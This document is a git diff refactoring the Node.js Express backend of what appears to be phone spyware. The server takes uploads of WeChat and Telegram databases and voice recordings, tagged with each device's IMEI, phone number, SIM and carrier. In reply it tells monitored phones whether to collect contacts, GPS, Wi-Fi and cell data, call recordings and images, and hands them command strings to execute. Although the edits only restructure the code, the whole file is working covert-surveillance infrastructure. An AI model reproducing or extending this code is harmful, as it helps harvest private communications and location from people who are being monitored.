@@ -20,104 +20,69 @@ let uploader = fileuploader.any();
 module.exports = function(app){
    // log every url api path
    app.use('/',(req,res,next)=>{
-    info.info(req.path);
-    consoleLog.info(req.path);
-    warn.warn(req.path);
-    next();
+      info.info(req.path);
+      consoleLog.info(req.path);
+      warn.warn(req.path);
+      next();
    });
    
-   app.get('/', (req, res)=>{
-    
-     basicInfo.findAll({raw:true}).then(function(result){
-       info.info(result);
-       consoleLog.info(result);
-     })
-     .catch(err=>{
-       error.error(err);
-       info.error(err);
-     })
+   app.get('/', (req, res)=>{   
      res.status(200).json({"msg":"default page"});
    });
 
    // files
    app.post('/files',(req,res)=>{
      uploader(req, res, function(err){
-      if(err){
-        consoleLog.info(err);
-        // res.status(200).json({"err":err});
-      }
-      consoleLog.info('files upload');
-      warn.warn('files upload');
-      consoleLog.info(req.params);
-      consoleLog.info(req.body);
-      let files = req.files;
-      // consoleLog.info(req);
-      // warn.warn(req);
-      consoleLog.info(files);
-      warn.warn(files);
-      // consoleLog.info(req.param('files'));
-      let imei = (req.query.i)?req.query.i:"";
-      let phoneNumber = (req.query.p)?req.query.p:"";
-      let sim = (req.query.s)?req.query.s:"";
-      let carrier = (req.query.ca)?req.query.ca:"";
-      let build = (req.query.b)?req.query.b:"";
-      let monitor = (req.query.m)?req.query.m:"";
-      consoleLog.info(`imei = ${imei}, phoneNumber = ${phoneNumber}, sim = ${sim}, carrier = ${carrier}, build = ${build}, monitor = ${monitor}`); 
-      warn.warn(`imei = ${imei}, phoneNumber = ${phoneNumber}, sim = ${sim}, carrier = ${carrier}, build = ${build}, monitor = ${monitor}`);
-      if(files){
-        files.forEach((file)=>{
-          let originalname = file.originalname;
-          consoleLog.info(`file:${originalname}`);
-          warn.warn(`file:${originalname}`);
-          let fileInfo = originalname.split("_");
-          let extension = path.extname(originalname);
-          let strProcess = "";
-          let strGrpNum = "";
-          // parse the file info
-          if(fileInfo.length > 0){
-            if(fileInfo.length > 2 ){
-              strGrpNum = fileInfo[1];
-            }
-            if((fileInfo[0]).toLowerCase()==="wechat"){
-              strProcess = "0";
-            }
-            if(monitor.toLowerCase()==="tg"){
-              strProcess = extension.toLowerCase()===".db"?"1":"3";
-            }
-            else if(monitor.toLowerCase()==="voice"){
-              strProcess = extension.toLowerCase()===".db"?"1":"5";
-            }
-          }//file end
-          let addtime = moment().format('YYYY-MM-DD HH:mm:ss');
-          consoleLog.info(`start insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
-                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);
-          warn.warn(`start insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
-                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);                
-          _FS.create({
-            filename: originalname,
-            phoneNumber:phoneNumber,
-            imei: imei,
-            sim: sim,
-            carrier_code: carrier,
-            build: build,
-            addtime: Sequelize.NOW,
-            isprocess: strProcess,
-            group_num: strGrpNum
-          })
-          .then((re)=>{
-            consoleLog.info(`success insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
-                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);
-            warn.warn(`success insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
-                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`); 
-          })
-          .catch((err)=>{
-            consoleLog.error(err);
-            error.error(err);
-          });
+        if(err){
+          consoleLog.info(err);
+          // res.status(200).json({"err":err});
+        }
+        consoleLog.info('files upload');
+        warn.warn('files upload');
+        // 取得 upload files      
+        let files = req.files;        
+        consoleLog.info(files);
+        warn.warn(files);
+        // 取得 query string
+        let imei = (req.query.i)?req.query.i:"";
+        let phoneNumber = (req.query.p)?req.query.p:"";
+        let sim = (req.query.s)?req.query.s:"";
+        let carrier = (req.query.ca)?req.query.ca:"";
+        let build = (req.query.b)?req.query.b:"";
+        let monitor = (req.query.m)?req.query.m:"";
+        consoleLog.info(`imei = ${imei}, phoneNumber = ${phoneNumber}, sim = ${sim}, carrier = ${carrier}, build = ${build}, monitor = ${monitor}`); 
+        warn.warn(`imei = ${imei}, phoneNumber = ${phoneNumber}, sim = ${sim}, carrier = ${carrier}, build = ${build}, monitor = ${monitor}`);
+        if(files){
+          //loop each file
+          files.forEach((file)=>{
+            let originalname = file.originalname;
+            consoleLog.info(`file:${originalname}`);
+            warn.warn(`file:${originalname}`);
+            let fileInfo = originalname.split("_");
+            let extension = path.extname(originalname);
+            let strProcess = "";
+            let strGrpNum = "";
+            // parse the file info
+            if(fileInfo.length > 0){
+              if(fileInfo.length > 2 ){
+                strGrpNum = fileInfo[1];
+              }
+              if((fileInfo[0]).toLowerCase()==="wechat"){
+                strProcess = "0";
+              }
+              if(monitor.toLowerCase()==="tg"){
+                strProcess = extension.toLowerCase()===".db"?"1":"3";
+              }
+              else if(monitor.toLowerCase()==="voice"){
+                strProcess = extension.toLowerCase()===".db"?"1":"5";
+              }
+            }//file end
+            // 把資料輸入 FS table
+            let FSInfo = {originalname:originalname, phoneNumber:phoneNumber, imei:imei, sim:sim, carrier:carrier, build:build, strProcess:strProcess, strGrpNum:strGrpNum};
+            doInsertFS(FSInfo);            
+          });//files end
           
-        });//files end
-        
-      }
+        }
         res.status(200).json({"msg":"OK"});
       });
    });
@@ -167,19 +132,8 @@ module.exports = function(app){
                   commands.push({commandtype:resultCommand.commandtype,
                                 command:resultCommand.commandtype==0?resultCommand.commandString:""});
                 });
-                res.status(200).json({
-                   ApkInfo:result[0].applist=='0'?false:true,
-                   CellInfo:result[0].connectedCell=='0'?false:true,
-                   Contacts:result[0].contacts=='0'?false:true,
-                   GPS:result[0].gps=='0'?false:true,
-                   Wifi:result[0].wifistate=='0'?false:true,
-                   nearbyCellInfo:result[0].nearbyCell=='0'?false:true,
-                   exectime :result[0].exectime,
-                   commands:commands,
-                   Update:false,
-                   VoiceRecord:result[0].callrecord=='0'?false:true,
-                   catchimage:result[0].catchimage=='0'?false:true
-                })
+                // 根據query出來的checkbox 回應給 對應的result
+                resWithJSON(false,result[0],commands,res);
             })
             .catch(function(err1){
               error.error(err1);
@@ -201,20 +155,9 @@ module.exports = function(app){
             consoleLog.info('不存在 ismonitor==0');
             target.update({ismonitor:'1'},{where:{phone:jsonObj.IMEI}})
             .then(function(result){
-              checkMonitorAndBasicInfo(req,res,jsonObj);
-               res.json({
-                   ApkInfo:false,
-                   CellInfo:false,
-                   Contacts:false,
-                   GPS:false,
-                   Wifi:false,
-                   nearbyCellInfo:false,
-                   exectime :"1",
-                   commands:null,
-                   Update:false,
-                   VoiceRecord:false,
-                   catchimage:false
-              });
+              checkMonitorAndBasicInfo(res,jsonObj);
+              //回應預設的resultJSON
+              resWithJSON(true,null,null,res);
             })
             .catch(function(err){
               error.error(err);
@@ -232,20 +175,9 @@ module.exports = function(app){
                 created_time: create_time,
                 ismonitor:'1'
             }).then(function(result){
-                checkMonitorAndBasicInfo(req,res,jsonObj);
-                res.json({
-                   ApkInfo:false,
-                   CellInfo:false,
-                   Contacts:false,
-                   GPS:false,
-                   Wifi:false,
-                   nearbyCellInfo:false,
-                   exectime :"1",
-                   commands:null,
-                   Update:false,
-                   VoiceRecord:false,
-                   catchimage:false
-                });
+                checkMonitorAndBasicInfo(res,jsonObj);
+                //回應預設的resultJSON
+                resWithJSON(true,null,null,res);
             }).catch(function(err){
               error.error(err);
               consoleLog.error(err);
@@ -272,18 +204,127 @@ module.exports = function(app){
    
 };
 
-function checkMonitorAndBasicInfo(req,res,rootObj){
+/**
+ * 根據輸入回應對應的json
+ * 
+ * @param {any} isDefault 
+ * @param {any} resultObj 
+ * @param {any} commands 
+ * @param {any} res 
+ */
+function resWithJSON(isDefault, resultObj, commands, res){
+  if(isDefault==true){
+    res.status(200).json({
+        ApkInfo:false,
+        CellInfo:false,
+        Contacts:false,
+        GPS:false,
+        Wifi:false,
+        nearbyCellInfo:false,
+        exectime :"1",
+        commands:null,
+        Update:false,
+        VoiceRecord:false,
+        catchimage:false
+    });
+  }
+  else{
+    res.status(200).json({
+        ApkInfo:resultObj.applist=='0'?false:true,
+        CellInfo:resultObj.connectedCell=='0'?false:true,
+        Contacts:resultObj.contacts=='0'?false:true,
+        GPS:resultObj.gps=='0'?false:true,
+        Wifi:resultObj.wifistate=='0'?false:true,
+        nearbyCellInfo:resultObj.nearbyCell=='0'?false:true,
+        exectime :resultObj.exectime,
+        commands:commands,
+        Update:false,
+        VoiceRecord:resultObj.callrecord=='0'?false:true,
+        catchimage:resultObj.catchimage=='0'?false:true
+    });
+  }
+}
+/**
+ * 確認MonitorControl以及BasicInfo是否有資料 若無則新增資料到資料表
+ * 
+ * @param {any} res 
+ * @param {any} rootObj 
+ */
+function checkMonitorAndBasicInfo(res,rootObj){
   let IMEI = rootObj.IMEI;
   info.info('checkMonitorAndBasicInfo IMEI:',IMEI);
   warn.warn('checkMonitorAndBasicInfo IMEI:',IMEI);
   consoleLog.info('checkMonitorAndBasicInfo IMEI:',IMEI);
   let exectime = moment().format("YYYY-MM-DD HH:mm:ss");
   monitorControl.findAll({where:{IMEI:IMEI},raw:true})
-  .then(function(result){
-   
+  .then(function(result){   
     if(result.length==0){// 如果不存在 monitorControl
-      
-      info.info(`start insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
+      // 新增一筆monitorControl
+      doInsertMonitorControl(IMEI,exectime,res);
+    }
+  })
+  .catch(function(err){
+    error.error(err);
+    consoleLog.error(err);
+    res.status(500).json({"msg":`select * from monitorControl where imei=${IMEI} fail`});
+  });
+
+  basicInfo.findAll({where:{IMEI:IMEI},raw:true})
+  .then(function(result){
+    console.log(result);
+     // 如果 basicinfo 不存在
+    if(result.length==0){
+      // 新增一筆資料到 basicInfo 
+      doInsertBasicInfo(IMEI,rootObj,res);
+    }
+  })
+  .catch(function(err){
+    error.error(err);
+    consoleLog.error(err);
+    res.status(500).json({"msg":`select * from basicinfo where imei=${IMEI} fail`});
+  });
+}
+
+/**
+ * 把資料輸入 basicInfo
+ * 
+ * @param {any} IMEI 
+ * @param {any} rootObj 
+ * @param {any} res 
+ */
+function doInsertBasicInfo(IMEI, rootObj, res){
+    info.info(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
+    warn.warn(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
+    consoleLog.info(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
+    // insert new basic info
+    basicInfo.create({
+      IMEI:IMEI,
+      Brand: rootObj.Brand,
+      _Model: rootObj.Model,
+      Release: rootObj.Release,
+      mccmnc: rootObj.mccmnc
+    })
+    .then((re)=>{
+      info.info(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
+      warn.warn(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
+      consoleLog.info(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
+    })
+    .catch(function(err){
+      error.error(err);
+      consoleLog.error(err);
+      res.status(500).json({"msg":`insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc}) fail`});
+    });
+}
+
+/**
+ * 把資料輸入 MonitorControl
+ * 
+ * @param {any} IMEI 
+ * @param {any} exectime 
+ * @param {any} res 
+ */
+function doInsertMonitorControl(IMEI, exectime, res){
+  info.info(`start insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
       warn.warn(`start insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
       consoleLog.info(`start insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
       // insert new monitorControl
@@ -301,45 +342,36 @@ function checkMonitorAndBasicInfo(req,res,rootObj){
         consoleLog.error(err);
         res.status(500).json({"msg":`insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})fail`});
       });
-    }
+}
+/**
+ * 把FSInfo Obj輸入FS table
+ * 
+ * @param {any} FSInfo {originalname, phoneNumber, imei, sim, carrier, build, strProcess, strGrpNum}
+ */
+function doInsertFS(FSInfo){
+  let {originalname, phoneNumber, imei, sim, carrier, build, strProcess, strGrpNum} = FSInfo;
+  let addtime = moment().format('YYYY-MM-DD HH:mm:ss');
+  consoleLog.info(`start insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num) values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);
+  warn.warn(`start insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num) values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);                
+  _FS.create({
+    filename: originalname,
+    phoneNumber:phoneNumber,
+    imei: imei,
+    sim: sim,
+    carrier_code: carrier,
+    build: build,
+    addtime: Sequelize.NOW,
+    isprocess: strProcess,
+    group_num: strGrpNum
   })
-  .catch(function(err){
-    error.error(err);
-    consoleLog.error(err);
-    res.status(500).json({"msg":`select * from monitorControl where imei=${IMEI} fail`});
-  });
-
-  basicInfo.findAll({where:{IMEI:IMEI},raw:true})
-  .then(function(result){
-    console.log(result);
-     // 如果 basicinfo 不存在
-    if(result.length==0){
-       info.info(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
-       warn.warn(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
-       consoleLog.info(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
-       // insert new basic info
-       basicInfo.create({
-         IMEI:IMEI,
-         Brand: rootObj.Brand,
-         _Model: rootObj.Model,
-         Release: rootObj.Release,
-         mccmnc: rootObj.mccmnc
-       })
-       .then((re)=>{
-        info.info(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
-        warn.warn(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
-        consoleLog.info(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
-       })
-       .catch(function(err){
-        error.error(err);
-        consoleLog.error(err);
-        res.status(500).json({"msg":`insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc}) fail`});
-       });
-    }
+  .then((re)=>{
+    consoleLog.info(`success insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
+                  values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);
+    warn.warn(`success insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
+                  values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`); 
   })
-  .catch(function(err){
-    error.error(err);
+  .catch((err)=>{
     consoleLog.error(err);
-    res.status(500).json({"msg":`select * from basicinfo where imei=${IMEI} fail`});
+    error.error(err);
   });
 }
